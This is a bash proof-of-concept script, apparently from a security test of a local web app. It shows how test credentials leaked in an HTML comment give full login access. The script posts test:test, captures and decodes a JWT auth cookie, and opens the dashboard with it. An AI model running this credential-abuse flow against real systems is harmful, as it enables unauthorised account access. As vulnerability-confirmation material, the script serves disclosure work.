#!/bin/bash

# POC: Hardcoded Test Credentials Authentication Bypass
# This script demonstrates the exploitation of hardcoded test credentials
# exposed in HTML comments on the login page

TARGET="http://localhost:8080"
USERNAME="test"
PASSWORD="test"
USER_ID="10032"

echo "=========================================="
echo "Hardcoded Credentials Auth Bypass POC"
echo "=========================================="
echo ""

# Step 1: Retrieve login page and extract hardcoded credentials from HTML comments
echo "[*] Step 1: Fetching login page to look for exposed credentials..."
LOGIN_PAGE=$(curl -s "$TARGET/")

# Check for hardcoded credentials in HTML comments
if echo "$LOGIN_PAGE" | grep -q "TODO.*Delete.*testing.*account"; then
    echo "[+] FOUND: Hardcoded test credentials exposed in HTML comment!"
    echo "[+] Comment content:"
    echo "$LOGIN_PAGE" | grep -o "<!-- TODO.*-->" | head -1
else
    echo "[-] Warning: Expected HTML comment not found, continuing anyway..."
fi
echo ""

# Step 2: Attempt initial login with test:test
echo "[*] Step 2: Attempting login with credentials: $USERNAME:$PASSWORD"
LOGIN_RESPONSE=$(curl -s -i -X POST "$TARGET/" \
    -d "username=$USERNAME&password=$PASSWORD" \
    -H "Content-Type: application/x-www-form-urlencoded")

# Extract redirect location
REDIRECT_LOCATION=$(echo "$LOGIN_RESPONSE" | grep -i "^Location:" | awk '{print $2}' | tr -d '\r')

if [[ "$LOGIN_RESPONSE" == *"302"* ]] || [[ "$LOGIN_RESPONSE" == *"301"* ]]; then
    echo "[+] Login POST successful - received redirect"
    echo "[+] Redirect location: $REDIRECT_LOCATION"
else
    echo "[-] Initial login attempt failed or unexpected response"
fi
echo ""

# Step 3: Access the password confirmation page
echo "[*] Step 3: Accessing password confirmation page..."
PASSWORD_PAGE=$(curl -s "$TARGET/password/$USERNAME")

if echo "$PASSWORD_PAGE" | grep -q "Welcome"; then
    echo "[+] Password confirmation page accessible!"
    GREETING=$(echo "$PASSWORD_PAGE" | grep -o "Welcome[^<]*" | head -1)
    echo "[+] Page content shows: $GREETING"
else
    echo "[-] Password confirmation page returned unexpected content"
fi

# Extract user_id from hidden fields
EXTRACTED_USER_ID=$(echo "$PASSWORD_PAGE" | grep -o 'user_id.*value="[^"]*"' | grep -o '[0-9]*$')
if [[ ! -z "$EXTRACTED_USER_ID" ]]; then
    echo "[+] Extracted user_id from page: $EXTRACTED_USER_ID"
fi
echo ""

# Step 4: Complete authentication with full credentials
echo "[*] Step 4: Completing authentication with full credentials..."
AUTH_RESPONSE=$(curl -s -i -X POST "$TARGET/password/$USERNAME" \
    -d "username=$USERNAME&user_id=$USER_ID&password=$PASSWORD" \
    -H "Content-Type: application/x-www-form-urlencoded")

# Extract auth token from Set-Cookie header
AUTH_TOKEN=$(echo "$AUTH_RESPONSE" | grep -i "^Set-Cookie:" | grep -o "auth_token=[^;]*" | cut -d'=' -f2)

if [[ ! -z "$AUTH_TOKEN" ]]; then
    echo "[+] AUTHENTICATION SUCCESSFUL!"
    echo "[+] Auth token obtained: ${AUTH_TOKEN:0:50}..."
    
    # Decode JWT payload (simple base64 decode, no verification)
    JWT_PAYLOAD=$(echo "$AUTH_TOKEN" | cut -d'.' -f2)
    # Add padding if needed
    padding=$((4 - ${#JWT_PAYLOAD} % 4))
    if [ $padding -ne 4 ]; then
        JWT_PAYLOAD="${JWT_PAYLOAD}$(printf '%*s' $padding | tr ' ' '=')"
    fi
    DECODED=$(echo "$JWT_PAYLOAD" | base64 -d 2>/dev/null)
    
    if [[ ! -z "$DECODED" ]]; then
        echo "[+] JWT Payload: $DECODED"
    fi
else
    echo "[-] Failed to obtain auth token"
fi

if echo "$AUTH_RESPONSE" | grep -q -i "location:.*dashboard"; then
    echo "[+] Redirect to dashboard confirmed - authentication successful!"
else
    echo "[*] Response includes redirect to protected area"
fi
echo ""

# Step 5: Verify access to dashboard
echo "[*] Step 5: Verifying access to dashboard with obtained token..."
if [[ ! -z "$AUTH_TOKEN" ]]; then
    DASHBOARD_RESPONSE=$(curl -s -i "$TARGET/dashboard" \
        -H "Cookie: auth_token=$AUTH_TOKEN")
    
    if echo "$DASHBOARD_RESPONSE" | grep -q -i "HTTP.*200"; then
        echo "[+] CRITICAL: Dashboard is accessible with test credentials!"
        echo "[+] Authentication bypass confirmed - test account has full access"
    else
        echo "[*] Dashboard access check completed"
    fi
fi
echo ""

echo "=========================================="
echo "POC SUMMARY: Hardcoded credentials 'test:test'"
echo "provide complete authentication bypass to the"
echo "application. This is a CRITICAL vulnerability."
echo "=========================================="